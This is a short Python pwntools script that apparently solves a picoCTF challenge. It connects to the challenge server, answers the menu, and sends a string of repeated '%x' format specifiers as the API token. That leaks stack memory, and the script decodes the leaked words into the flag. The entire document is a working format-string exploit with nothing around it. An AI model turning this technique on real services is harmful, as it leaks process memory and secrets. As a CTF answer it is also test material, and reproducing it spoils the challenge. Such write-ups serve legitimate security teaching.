#!/usr/bin/python3

from pwn import *
import re

HOST="mercury.picoctf.net"
PORT=27912

r = remote(HOST, PORT)

# read up to the first prompt
r.recvuntil("View my")
# select optin 1
r.send("1\n")
# read up to where the API token should be entered
r.recvuntil("What is your API token?\n")

# EXPLOIT: send multiple %x so the stack values get returned
r.send("%x" + "-%x"*40 + "\n")

r.recvline()

x = r.recvline()

x = x[:-1].decode()

s = ""
for i in x.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

print(re.findall("picoCTF\{.*?\}", s)[0])
